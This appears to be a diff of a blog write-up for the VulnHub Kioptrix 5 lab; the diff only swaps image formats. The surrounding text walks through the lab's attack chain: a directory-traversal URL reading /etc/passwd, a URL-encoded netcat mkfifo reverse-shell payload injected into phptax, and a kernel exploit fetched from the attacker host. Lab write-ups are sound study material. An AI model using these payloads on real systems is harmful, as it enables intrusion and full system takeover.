@@ -8,7 +8,7 @@ categories: ["writeups"]
 series: []
 showToc: true
 cover:
-  image: "https://cdn.ziomsec.com/kioptrix5/cover.png"
+  image: "https://cdn.ziomsec.com/kioptrix5/cover.webp"
   caption: "Kioptrix 5 VulnHub Challenge"
   alt: "Kioptrix 5 cover"
 platform: "VulnHub"
@@ -39,7 +39,7 @@ nmap -A -p- TARGET --min-rate 10000 -oN nmap.out
 | 80       | http        |
 | 8080     | http        |
 
-![](https://cdn.ziomsec.com/kioptrix5/1.png)
+![](https://cdn.ziomsec.com/kioptrix5/1.webp)
 
 ## Initial Foothold
 
@@ -49,7 +49,7 @@ I tried fetching information about the application running on port 8080 but was 
 curl http://TARGET:8080
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/2.png)
+![](https://cdn.ziomsec.com/kioptrix5/2.webp)
 
 I fetched information about port 80 using **curl** and found an interesting path.
 
@@ -57,11 +57,11 @@ I fetched information about port 80 using **curl** and found an interesting path
 curl http://TARGET
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/3.png)
+![](https://cdn.ziomsec.com/kioptrix5/3.webp)
 
 I accessed the path mentioned in the comment and got access to a charting application.
 
-![](https://cdn.ziomsec.com/kioptrix5/4.png)
+![](https://cdn.ziomsec.com/kioptrix5/4.webp)
 
 Since the version of this application was available, I searched **Exploit-DB** for any exploits related to it.
 
@@ -70,11 +70,11 @@ searchsploit "pChart"
 searchsploit -m php/webapps/31173.txt
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/5.png)
+![](https://cdn.ziomsec.com/kioptrix5/5.webp)
 
 I found out that this particular version of the application was vulnerable to directory traversal.
 
-![](https://cdn.ziomsec.com/kioptrix5/6.png)
+![](https://cdn.ziomsec.com/kioptrix5/6.webp)
 
 Hence, used the provided payload to read the contents of the */etc/passwd* file.
 
@@ -82,7 +82,7 @@ Hence, used the provided payload to read the contents of the */etc/passwd* file.
 http://TARGET/pChart2.1.3/examples/index.php?Action=View&Script=/../../etc/passwd
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/7.png)
+![](https://cdn.ziomsec.com/kioptrix5/7.webp)
 
 I then searched for the path where FreeBSD systems store Apache configuration files.
 
@@ -92,9 +92,9 @@ I then searched for the path where FreeBSD systems store Apache configuration fi
 
 I accessed this file and found the reason why I was being denied on port 8080.
 
-![](https://cdn.ziomsec.com/kioptrix5/8.png)
+![](https://cdn.ziomsec.com/kioptrix5/8.webp)
 
-![](https://cdn.ziomsec.com/kioptrix5/9.png)
+![](https://cdn.ziomsec.com/kioptrix5/9.webp)
 
 It required a specific user-agent. So I used **curl** to fetch information about that port by adding this user-agent.
 
@@ -102,7 +102,7 @@ It required a specific user-agent. So I used **curl** to fetch information about
 curl http://TARGET:8080 -A "Mozilla/4.0 Mozilla4_browser"
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/10.png)
+![](https://cdn.ziomsec.com/kioptrix5/10.webp)
 
 This had a directory listing and a link to "phptax". So I used **searchsploit** to look for exploits related to it.
 
@@ -112,7 +112,7 @@ This had a directory listing and a link to "phptax". So I used **searchsploit** 
 searchsplot "phptax"
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/11.png)
+![](https://cdn.ziomsec.com/kioptrix5/11.webp)
 
 I tried the exploit available on Metasploit but it didn't work. So, I use alternative from Exploit DB to get a reverse shell using **netcat**:
 - https://www.exploit-db.com/exploits/21665
@@ -126,19 +126,19 @@ rlwrap nc -lnvp 4444
 I then configured a **netcat mkfifo** payload from **revshells**, URL encoded it and used it to get a reverse shell.
 - https://www.revshells.com/
 
-![](https://cdn.ziomsec.com/kioptrix5/12.png)
+![](https://cdn.ziomsec.com/kioptrix5/12.webp)
 
 ```shell
 curl http://TARGET:8080/phptax/drawimage.php?pfilez=1040d1-pg2.tob;rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20KALI%20PORT%20%3E%2Ftmp%2Ff;&pdf=make -A "Mozilla/4.0 Mozilla4_browser"
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/13.png)
+![](https://cdn.ziomsec.com/kioptrix5/13.webp)
 
 ## Privilege Escalation
 
 The flag was present in the *root* directory but I did not have the permissions to read it.
 
-![](https://cdn.ziomsec.com/kioptrix5/14.png)
+![](https://cdn.ziomsec.com/kioptrix5/14.webp)
 
 I viewed the kernel information and searched for exploits related to it on **Exploit DB** using **searchsploit**.
 
@@ -146,13 +146,13 @@ I viewed the kernel information and searched for exploits related to it on **Exp
 uname -a
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/15.png)
+![](https://cdn.ziomsec.com/kioptrix5/15.webp)
 
 ```shell
 searchsploit "FreeBSD 9.0"
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/16.png)
+![](https://cdn.ziomsec.com/kioptrix5/16.webp)
 
 I downloaded the first exploit on the target.
 
@@ -160,7 +160,7 @@ I downloaded the first exploit on the target.
 fetch http://KALI/EXPLOIT
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/17.png)
+![](https://cdn.ziomsec.com/kioptrix5/17.webp)
 
 After compiling it, I ran the exploit to get root access.
 
@@ -169,7 +169,7 @@ gcc EXPLOIT
 ./a.out
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/18.png)
+![](https://cdn.ziomsec.com/kioptrix5/18.webp)
 
 Finally, I navigated to the root directory, fixed the permission of the flag and captured it.
 
@@ -179,9 +179,9 @@ chmod 777 congrats.txt
 cat congrats.txt
 ```
 
-![](https://cdn.ziomsec.com/kioptrix5/19.png)
+![](https://cdn.ziomsec.com/kioptrix5/19.webp)
 
-![](https://cdn.ziomsec.com/kioptrix5/20.png)
+![](https://cdn.ziomsec.com/kioptrix5/20.webp)
 
 ## Closure
 
